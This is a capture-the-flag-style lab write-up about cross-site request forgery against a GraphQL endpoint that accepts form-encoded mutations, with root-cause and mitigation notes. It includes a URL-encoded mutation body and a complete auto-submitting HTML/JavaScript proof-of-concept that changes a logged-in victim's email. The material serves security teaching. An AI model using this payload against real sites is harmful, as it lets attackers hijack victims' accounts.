Accessing CSRF over GraphQL

Lab Difficulty: Practitioner
Vulnerability: Cross-site request forgery against a GraphQL endpoint that accepts x-www-form-urlencoded

Summary
The user management actions use a GraphQL endpoint that accepts requests with content type x-www-form-urlencoded. Because of that, a simple HTML page can POST a GraphQL mutation on behalf of a logged-in victim and change their email. The fix is to require anti-CSRF tokens or reject form-encoded requests for GraphQL mutations.

Steps I followed to build the exploit

Logged in with the provided account wiener : peter in Burp’s browser and navigated to the profile page.

Changed the email to something new and clicked Update email while watching Proxy → HTTP history. The change was sent as a GraphQL mutation.

Sent that GraphQL request to Repeater. In Repeater I updated the mutation to change the email to a second address and sent it again to confirm the mutation works and the session cookie can be reused.

Converted the request to use content type x-www-form-urlencoded. I changed the request method so Burp removed the GraphQL body then re-added the body as URL encoded data. The final body looked like this (URL encoding intact):

query=%0A++++mutation+changeEmail%28%24input%3A+ChangeEmailInput%21%29+%7B%0A++++++++changeEmail%28input%3A+%24input%29+%7B%0A++++++++++++email%0A++++++++%7D%0A++++%7D%0A&operationName=changeEmail&variables=%7B%22input%22%3A%7B%22email%22%3A%22hacker%40hacker.com%22%7D%7D


Used Burp’s Generate CSRF PoC feature to create a basic HTML PoC from that request. Important step: modify the generated HTML so the PoC changes the victim’s email to a value different from the current email. If the exploit tries to set the same email the request will have no effect, so the PoC must attempt a third, different email.

Pasted the final HTML into the lab’s exploit server and delivered it to the victim. When the logged-in victim visited the exploit page, their email was changed and the lab was solved.

Example HTML PoC to upload to the exploit server

<!doctype html>
<html>
  <body>
    <form id="csrf" action="/graphql/v1" method="post" enctype="application/x-www-form-urlencoded">
      <input type="hidden" name="query" value="mutation changeEmail($input: ChangeEmailInput!) { changeEmail(input: $input) { email } }">
      <input type="hidden" name="operationName" value="changeEmail">
      <input type="hidden" name="variables" value='{"input":{"email":"pwned1@example.com"}}'>
    </form>
    <script>
      document.getElementById('csrf').elements['variables'].value = '{"input":{"email":"firststep@example.com"}}';
      document.getElementById('csrf').submit();
      setTimeout(function(){
        var f = document.createElement('form');
        f.method = 'post';
        f.enctype = 'application/x-www-form-urlencoded';
        f.action = '/graphql/v1';
        var q = document.createElement('input');
        q.type = 'hidden';
        q.name = 'query';
        q.value = 'mutation changeEmail($input: ChangeEmailInput!) { changeEmail(input: $input) { email } }';
        var o = document.createElement('input');
        o.type = 'hidden';
        o.name = 'operationName';
        o.value = 'changeEmail';
        var v = document.createElement('input');
        v.type = 'hidden';
        v.name = 'variables';
        v.value = '{"input":{"email":"finalpwned@example.com"}}';
        f.appendChild(q);
        f.appendChild(o);
        f.appendChild(v);
        document.body.appendChild(f);
        f.submit();
      }, 200);
    </script>
  </body>
</html>


Notes and
 Make sure the PoC actually changes the email from whatever it currently is. If it sets the same value the mutation will silently do nothing. That’s why I include a two-step change in the example.
 The endpoint needs to accept x-www-form-urlencoded for this to work. If the app rejects form-encoded GraphQL mutations, CSRF via plain form POST won’t work.
 Test the PoC on your own account first to confirm it performs the expected change before delivering to the victim.

Root cause
The GraphQL endpoint accepts form-encoded requests and performs state-changing mutations without any CSRF protection. No anti-CSRF token or other origin checks are enforced, so a third-party page can trigger mutations using the victim’s session cookie.

Fixes and mitigation
 Implement anti-CSRF tokens and require them for any state-changing request.
 Require content types like application/json for GraphQL mutations and reject form-encoded mutation requests. That makes CSRF via plain HTML forms harder.
 Enforce strict same-origin checks on state-changing endpoints.
 Use double-submit cookies or same-site cookie flags where appropriate. same-site cookie attribute set to lax or strict helps reduce CSRF risk for many flows.
